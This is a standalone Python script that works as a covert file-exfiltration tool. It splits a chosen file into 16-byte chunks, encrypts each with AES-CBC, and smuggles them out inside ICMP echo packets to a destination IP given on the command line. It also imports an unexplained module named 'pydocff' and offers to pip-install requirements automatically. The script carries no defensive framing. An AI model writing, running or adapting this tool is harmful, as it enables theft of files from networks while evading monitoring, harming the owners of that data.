#!/usr/bin/env python3

# --Imports and Dependencies-- #
import os  # <-- used for the required modules check

try:
    import pydocff
    import sys
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding
    from scapy.all import IP, ICMP, send

except ImportError:
    print("Error: Required modules not found.")
    if input("Do you want to install the required modules? (Y/n)").lower() != "n":
        if os.path.exists("requirements.txt"):
            os.system("pip install -r requirements.txt")
            exit(1)
        else:
            print("Error: requirements.txt not found, exiting.")
            exit(1)


def read_file_chunks(file_path, chunk_size=16):
    """
    Reads a file in chunks of a specified size.
    :param file_path: The path to the file to read
    :param chunk_size: The size of each chunk in bytes, defaults to 16 bytes
    :return: chunks: A list of file chunks
    """
    chunks = []
    try:
        with open(file_path, "rb") as file:
            while True:
                chunk = file.read(chunk_size)
                if not chunk:
                    break
                chunks.append(chunk)
        return chunks
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
        exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        exit(1)


def encrypt_chunk(chunk, key):
    """
    Encrypts a chunk of data using AES-CBC with PKCS7 padding.
    :param chunk: The chunk of data to encrypt
    :param key: The AES key
    :return: The encrypted chunk
    """
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(chunk) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext


def decrypt_chunk(encrypted_chunk, key):
    """
    Decrypts an encrypted chunk of data using AES-CBC with PKCS7 padding.
    :param encrypted_chunk:  The encrypted chunk of data
    :param key:  The AES key
    :return:  The decrypted chunk
    """
    iv = encrypted_chunk[:16]
    ciphertext = encrypted_chunk[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data


def send_icmp_packets(chunks, dst_ip, key):
    """
    Sends encrypted chunks of data in ICMP packets to a destination IP address.
    :param chunks: The list of data chunks to send
    :param dst_ip: The destination IP address
    :param key: The AES key
    :return: Nothing
    """
    print("Sending ICMP packets...")
    for idx, chunk in enumerate(chunks):
        encrypted_chunk = encrypt_chunk(chunk, key)
        decrypted_chunk = decrypt_chunk(encrypted_chunk, key)
        print(f"Decrypted chunk {idx + 1}: {decrypted_chunk.decode('utf-8')}")
        packet = IP(dst=dst_ip) / ICMP() / encrypted_chunk
        send(packet)
        print(f"Sent chunk {idx + 1} of {len(chunks)}")


def main():
    if len(sys.argv) != 4:
        print("Usage: python script.py <file_path> <destination_ip> <key>")
        exit(1)

    file_path = sys.argv[1]
    dst_ip = sys.argv[2]
    key = sys.argv[3]

    if not os.path.isfile(file_path):
        print(f"Error: '{file_path}' is not a valid file path.")
        exit(1)

    chunk_size = 16  # Bytes
    chunks = read_file_chunks(file_path, chunk_size)
    if len(key) not in [16, 24, 32]:
        print("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.")
        exit(1)
    key = key.encode("utf-8")
    send_icmp_packets(chunks, dst_ip, key)


if __name__ == "__main__":
    main()
